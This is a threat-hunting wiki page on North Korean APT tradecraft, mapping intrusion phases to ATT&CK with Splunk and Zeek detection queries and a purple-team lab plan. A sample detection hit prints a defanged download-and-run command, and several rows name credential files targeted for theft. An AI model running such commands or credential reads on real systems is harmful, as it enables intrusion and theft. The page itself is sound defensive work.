---
title: North Korea — TTPs & Hunting
tags:
  - threat-intel
  - apt
  - dprk
  - detection
---

# North Korea — TTPs & Hunting

<div class="dfir-meta" markdown>
**Category:** Actor TTPs → detection · **Covers:** Lazarus, APT38/BlueNoroff, TraderTraitor, AppleJeus cluster, Andariel, Kimsuky, APT37 · **Last updated:** 2026-10-07
</div>

!!! abstract "Summary"
    The DPRK playbook, phase by phase: how they get in (fake recruiters, coding tests, poisoned packages, supply chain, document lures), what runs, how they steal credentials and **cloud session tokens**, how they pivot and what they finally do. Every phase is mapped to ATT&CK and to the technique pages on this site, followed by hunts you can run in Splunk and Zeek. Background on the groups is in [Groups & incidents](dprk-overview.md).

## The playbook by phase

### 1. Initial access — they target the person

| Behaviour | ATT&CK | Who (as reported) | Where to look |
|---|---|---|---|
| Fake recruiter on LinkedIn/Telegram/WhatsApp sends a "job description" PDF or a link | T1566.003 (Spearphishing via Service), T1566.002 | Lazarus (Dream Job), TraderTraitor | Browser downloads, `Zone.Identifier`, email/proxy logs |
| "Take-home coding test" — a GitHub/Bitbucket repo or ZIP the victim runs with `npm install` / `python main.py` | T1204.002 (Malicious File), T1195.001 | TraderTraitor, Contagious Interview | Process tree under `node`, `python`, `docker` |
| Malicious or typosquatted **npm / PyPI** packages | T1195.001 (Compromise Software Dependencies) | TraderTraitor, Contagious Interview | Package manifests, `postinstall` scripts, EDR on dev hosts |
| Trojanised trading / crypto apps, sometimes signed | T1195.002, T1553.002 (Code Signing) | AppleJeus cluster | New unsigned/odd-publisher binaries in Amcache, macOS quarantine events |
| Compromise of a **software vendor** to reach its customers | T1195.002 (Compromise Software Supply Chain), T1199 | AppleJeus cluster (3CX), TraderTraitor (JumpCloud) | Trusted vendor binary making new network connections |
| Document lures: LNK in ZIP, CHM, HWP, Office | T1566.001, T1204.002 | Kimsuky, APT37 | See [Phishing delivery](../adversary/phishing-delivery.md) |
| Fake job **applicant** (IT worker) hired remotely | T1078 (Valid Accounts), insider | Famous Chollima | HR process, VPN geolocation, remote-admin tools on corporate laptops |

### 2. Execution and persistence

| Behaviour | ATT&CK | Site page |
|---|---|---|
| `node`/`python` spawning a shell, `curl`, or a downloader | T1059.007 (JavaScript), T1059.006 (Python) | — (hunt 1 below) |
| PowerShell download cradles, encoded commands (Windows lures) | T1059.001 | [PowerShell cradles](../adversary/powershell-cradles.md) |
| `mshta`, `rundll32`, `regsvr32` from LNK/CHM lures (Kimsuky) | T1218.005 / .011 / .010 | [LOLBins](../adversary/lolbins.md) |
| Scheduled tasks, services, Run keys | T1053.005, T1543.003, T1547.001 | [Persistence](../adversary/persistence.md) |
| macOS LaunchAgents / LaunchDaemons | T1543.001, T1543.004 | — (macOS: `~/Library/LaunchAgents`, `/Library/LaunchDaemons`) |
| Malicious browser extensions stealing mail (Kimsuky) | T1176 (Browser Extensions) | Extension folders in browser profiles |
| DLL side-loading / injection into trusted processes | T1574.002, T1055 | [Process injection](../adversary/process-injection.md) |

### 3. Credential access — and the cloud pivot

This is where DPRK operations differ from commodity crime: they go after **developer secrets and cloud sessions**, not only Windows hashes.

| Behaviour | ATT&CK | Site page / note |
|---|---|---|
| Browser passwords, cookies, crypto-wallet extension data | T1555.003, T1539 (Steal Web Session Cookie) | Infostealer behaviour — file access to browser profile folders |
| SSH keys, `.aws/credentials`, `.env`, `.npmrc`, keychain | T1552.001, T1552.004, T1555.001 | Watch reads of these paths by non-standard processes |
| Stolen **cloud session tokens** reused from attacker infrastructure | T1550.001 (Application Access Token), T1078.004 (Cloud Accounts) | Hunt 3 below (CloudTrail) |
| Registering a new MFA device on a stolen session | T1098.005 (Device Registration) | Hunt 3 below |
| LSASS, SAM/NTDS, Kerberos abuse inside Windows networks | T1003, T1558 | [LSASS](../adversary/lsass-dumping.md) · [SAM & NTDS](../adversary/sam-ntds-extraction.md) · [Kerberoasting](../adversary/kerberoasting.md) |

### 4. Lateral movement, C2 and objective

| Behaviour | ATT&CK | Site page |
|---|---|---|
| RDP, SMB/PsExec, WMI with stolen credentials | T1021.001, T1021.002, T1047 | [RDP](../adversary/rdp.md) · [PsExec](../adversary/psexec-smb.md) · [WMI](../adversary/wmi-winrm.md) |
| HTTPS C2 to compromised legitimate websites; custom protocols | T1071.001, T1573 | [Beaconing & C2](../network/beaconing-c2.md) |
| C2 over **cloud storage APIs** (Dropbox, pCloud, Google Drive, OneDrive) — APT37, Kimsuky | T1102.002 (Bidirectional Web Service) | Hunt 4 below |
| Multi-hop proxies, VPNs, residential IPs | T1090.003 (Multi-hop Proxy) | Login geolocation / ASN anomalies |
| Tampering with a transaction front-end or signing flow (Bybit) | T1565 (Data Manipulation) | File integrity monitoring on web assets / S3 buckets |
| Financial theft | T1657 (Financial Theft) | Business process monitoring |
| Wipers / ransomware (Sony, Maui) | T1485, T1486 | [Ransomware playbook](../playbooks/ransomware.md) |

## Hunts

All queries use the BOTSv3-style index and sourcetypes used elsewhere on this site — change `index=` to match your environment.

=== "1 · Dev runtime spawning a shell"

    ```spl
    index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1
        (ParentImage="*\\node.exe" OR ParentImage="*\\python.exe" OR ParentImage="*\\pythonw.exe")
        (Image="*\\cmd.exe" OR Image="*\\powershell.exe" OR Image="*\\curl.exe" OR Image="*\\certutil.exe" OR Image="*\\mshta.exe")
    | stats count min(_time) as first max(_time) as last values(CommandLine) as cmd by host, User, ParentImage, Image
    | convert ctime(first) ctime(last)
    ```

    **What each line does**

    - `EventID=1` — Sysmon event 1 = **process created**. Every new process, with its parent and full command line.
    - `ParentImage="*\\node.exe" …` — keep only processes whose **parent** is Node.js or Python (the runtimes a "coding test" or malicious npm/PyPI package runs under). `\\` is one backslash written in SPL.
    - `Image=…` — the **child** is a shell or a download tool. Developers do run shells from Node, so expect some noise (build scripts); the interesting ones download or run encoded commands.
    - `stats … by host, User, ParentImage, Image` — collapse into one row per combination; `values(CommandLine)` lists the distinct commands.
    - `convert ctime(...)` — turn epoch numbers into readable dates.

    **What a hit looks like**

    | host | User | ParentImage | Image | cmd |
    |---|---|---|---|---|
    | DEV-LAPTOP07 | CORP\jkim | C:\Program Files\nodejs\node.exe | C:\Windows\System32\cmd.exe | `cmd /c curl -s hxxp://<ip>/p -o %TEMP%\p.py && python %TEMP%\p.py` |

    On macOS/Linux EDR the same idea: parent `node` / `python3`, child `sh`/`bash`/`curl`/`osascript`.

=== "2 · New binary from a trusted vendor talks out"

    ```spl
    index=botsv3 sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=3
    | stats dc(DestinationIp) as dests values(DestinationHostname) as names min(_time) as first by Image
    | where first > relative_time(now(), "-7d@d")
    | sort - dests
    ```

    - `EventID=3` — Sysmon network connection.
    - `stats … min(_time) as first by Image` — for every program, the first time it ever made a connection in the search window.
    - `where first > relative_time(now(), "-7d@d")` — keep programs that **started talking only in the last 7 days** (run the search over 30+ days so "first" means something). `relative_time(now(), "-7d@d")` = midnight seven days ago.
    - This catches the 3CX pattern: a signed, long-installed app that suddenly contacts new domains after an update.

=== "3 · Cloud token reuse & MFA device added (AWS)"

    ```spl
    index=botsv3 sourcetype=aws:cloudtrail
        eventName IN ("CreateVirtualMFADevice","EnableMFADevice","CreateAccessKey","AssumeRole","GetSessionToken","PutBucketPolicy","PutObject")
    | stats values(eventName) as actions dc(sourceIPAddress) as ips values(sourceIPAddress) as src values(userAgent) as ua by userIdentity.arn
    | where ips > 1 OR isnotnull(mvfind(actions,"MFADevice"))
    ```

    - `sourcetype=aws:cloudtrail` — AWS API audit log; every console/API call is one event.
    - `eventName IN (...)` — calls an intruder uses after stealing a session: add an MFA device, create keys, assume roles, change bucket policy, upload objects (Bybit: the front-end JavaScript in S3 was replaced).
    - `stats … by userIdentity.arn` — per identity, which actions, how many source IPs, which user agents.
    - `where ips > 1 OR …` — the same identity used from **more than one IP** (developer laptop + attacker VPN) or any MFA-device change. `mvfind(actions,"MFADevice")` returns the position of the first value matching the regex, or null.

=== "4 · C2 over cloud storage APIs (Zeek)"

    ```bash
    # SNI / host names of cloud-storage APIs contacted by hosts that are not normal sync clients
    zeek-cut ts id.orig_h server_name < ssl.log \
      | grep -Ei 'api\.dropboxapi\.com|content\.dropboxapi\.com|api\.pcloud\.com|graph\.microsoft\.com|www\.googleapis\.com' \
      | awk '{print $2, $3}' | sort | uniq -c | sort -rn | head -20
    ```

    - `zeek-cut` pulls named columns from a Zeek log; `server_name` is the TLS SNI (the host name the client asked for).
    - The `grep` keeps the API endpoints used for programmatic upload/download — APT37 and Kimsuky malware use these as C2 so traffic blends in.
    - Count per source host: a workstation with thousands of `api.pcloud.com` connections and no pCloud client installed is worth a look.

## A purple-team scenario built from this page

Use it with the [weekly purple-team loop](../learning/purple-team-loop.md):

1. **Week A — Delivery:** in a lab VM, run a harmless "coding test" repo whose `postinstall` script runs `cmd /c whoami > %TEMP%\out.txt`. Find it with hunt 1, in Prefetch/Amcache, and in Velociraptor (`Windows.System.Pslist`, `Windows.Forensics.Prefetch`).
2. **Week B — Credential access:** read a dummy `.aws\credentials` file from a script; check which log source (Sysmon 11? EDR file-read telemetry?) sees it. Record the gap if none.
3. **Week C — Cloud pivot:** in a free-tier lab AWS account, use the same access key from two IPs and add a virtual MFA device; confirm hunt 3 fires in CloudTrail.
4. **Week D — C2:** generate HTTPS traffic to a cloud-storage API from a script; confirm hunt 4 and Arkime/Zeek visibility.
5. Write one page per week: **behaviour → artifacts → query → ATT&CK ID → gaps**.

## References

- [MITRE ATT&CK — Lazarus Group (G0032)](https://attack.mitre.org/groups/G0032/) — full technique list with procedure examples
- [MITRE ATT&CK — Kimsuky (G0094)](https://attack.mitre.org/groups/G0094/) · [APT37 (G0067)](https://attack.mitre.org/groups/G0067/)
- [FBI PSA I-022625-PSA — Bybit](https://www.ic3.gov/PSA/2025/PSA250226)
- [Wiz — TraderTraitor deep dive (Bybit attack chain)](https://www.wiz.io/blog/north-korean-tradertraitor-crypto-heist)
- [Unit 42 — North Korean threat groups](https://unit42.paloaltonetworks.com/threat-assessment-north-korean-threat-groups-2024)
- Pages: [Groups & incidents](dprk-overview.md) · [Hunting patterns](../splunk/hunting-patterns.md) · [Zeek](../network/zeek/index.md)
